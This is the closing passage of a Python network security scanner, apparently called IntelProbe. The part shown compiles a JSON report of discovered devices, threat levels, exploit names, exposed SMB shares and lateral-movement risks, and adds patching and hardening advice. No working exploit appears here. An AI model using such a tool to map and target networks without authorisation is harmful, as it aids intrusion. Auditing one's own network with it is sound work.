                                       if d.threat_level == ThreatLevel.CRITICAL]),
                "high_threats": len([d for d in self.discovered_devices.values() 
                                   if d.threat_level == ThreatLevel.HIGH]),
                "total_exploits": sum(len(d.exploits) for d in self.discovered_devices.values()),
                "defensive_mode": self.defensive_mode
            },
            "devices": [asdict(device) for device in self.discovered_devices.values()],
            "threat_analysis": self._generate_threat_analysis(),
            "exploitation_summary": self._generate_exploitation_summary(),
            "mitigation_recommendations": self._generate_global_recommendations()
        }
        
        # Save report
        os.makedirs("reports", exist_ok=True)
        report_file = f"reports/comprehensive_security_assessment_{int(time.time())}.json"
        
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2, default=str)
        
        print(f"📄 Comprehensive report saved: {report_file}")
        
        # Display summary
        self._display_executive_summary()
        
        return report
    
    def _generate_threat_analysis(self) -> Dict:
        """Generate threat analysis"""
        threats = {
            "critical_vulnerabilities": [],
            "attack_vectors": [],
            "lateral_movement_risks": [],
            "data_exposure_risks": []
        }
        
        for device in self.discovered_devices.values():
            if device.threat_level == ThreatLevel.CRITICAL:
                threats["critical_vulnerabilities"].append({
                    "ip": device.ip,
                    "computer": device.computer_name,
                    "exploits": [e["name"] for e in device.exploits if e["severity"] == "CRITICAL"]
                })
            
            # Check for lateral movement risks
            if 445 in device.open_ports or 139 in device.open_ports:  # SMB
                threats["lateral_movement_risks"].append(device.ip)
            
            # Check for data exposure
            if device.shares:
                threats["data_exposure_risks"].append({
                    "ip": device.ip,
                    "shares": device.shares
                })
        
        return threats
    
    def _generate_exploitation_summary(self) -> Dict:
        """Generate exploitation summary"""
        exploit_summary = {}
        
        for device in self.discovered_devices.values():
            for exploit in device.exploits:
                exploit_name = exploit["name"]
                if exploit_name not in exploit_summary:
                    exploit_summary[exploit_name] = {
                        "severity": exploit["severity"],
                        "affected_devices": [],
                        "tools": exploit["tools"],
                        "impact": exploit.get("impact", "Unknown")
                    }
                exploit_summary[exploit_name]["affected_devices"].append(device.ip)
        
        return exploit_summary
    
    def _generate_global_recommendations(self) -> List[str]:
        """Generate global security recommendations"""
        recommendations = [
            "Implement network segmentation to limit lateral movement",
            "Deploy centralized logging and monitoring",
            "Establish incident response procedures",
            "Regular vulnerability scanning and patch management",
            "Implement zero-trust network architecture",
            "Deploy endpoint detection and response (EDR) solutions",
            "Conduct regular security awareness training",
            "Implement multi-factor authentication across all services"
        ]
        
        # Add specific recommendations based on findings
        smb_devices = [d for d in self.discovered_devices.values() if 445 in d.open_ports]
        if len(smb_devices) > 5:
            recommendations.insert(0, f"🚨 URGENT: {len(smb_devices)} devices with SMB exposed - Apply MS17-010 patches immediately")
        
        rdp_devices = [d for d in self.discovered_devices.values() if 3389 in d.open_ports]
        if len(rdp_devices) > 3:
            recommendations.insert(0, f"⚠️ {len(rdp_devices)} devices with RDP exposed - Implement VPN access and NLA")
        
        return recommendations
    
    def _display_executive_summary(self):
        """Display executive summary"""
        total = len(self.discovered_devices)
        critical = len([d for d in self.discovered_devices.values() if d.threat_level == ThreatLevel.CRITICAL])
        high = len([d for d in self.discovered_devices.values() if d.threat_level == ThreatLevel.HIGH])
        
        print(f"\n🎯 EXECUTIVE SUMMARY")
        print("=" * 80)
        print(f"📊 Total Devices Discovered: {total}")
        print(f"🔴 Critical Threats: {critical}")
        print(f"🟠 High Threats: {high}")
        print(f"🛡️ Defensive Mode: {'ACTIVE' if self.defensive_mode else 'MONITORING'}")
        
        if critical > 0:
            print(f"\n🚨 IMMEDIATE ACTION REQUIRED")
            print(f"   {critical} devices require immediate attention")
        
        print(f"\n📋 TOP RECOMMENDATIONS:")
        recommendations = self._generate_global_recommendations()
        for i, rec in enumerate(recommendations[:5], 1):
            print(f"   {i}. {rec}")

def main():
    """Main function"""
    scanner = AdvancedNetworkScanner()
    
    try:
        # Discover networks
        networks = scanner.discover_networks()
        
        if not networks:
            print("❌ No networks discovered")
            return
        
        # Start multitasking scan
        scanner.start_multitasking_scan(networks)
        
        # Generate comprehensive report
        scanner.generate_comprehensive_report()
        
        print("\n🎖️ MULTITASKING SECURITY ASSESSMENT COMPLETE")
        print("=" * 80)
        print("IntelProbe has successfully conducted comprehensive network security assessment")
        print("Author: Lintshiwe Slade | GitHub: @lintshiwe")
        
    except KeyboardInterrupt:
        print("\n⚠️ Assessment interrupted by user")
        scanner.scanning_active = False
    except Exception as e:
        print(f"\n❌ Error during assessment: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
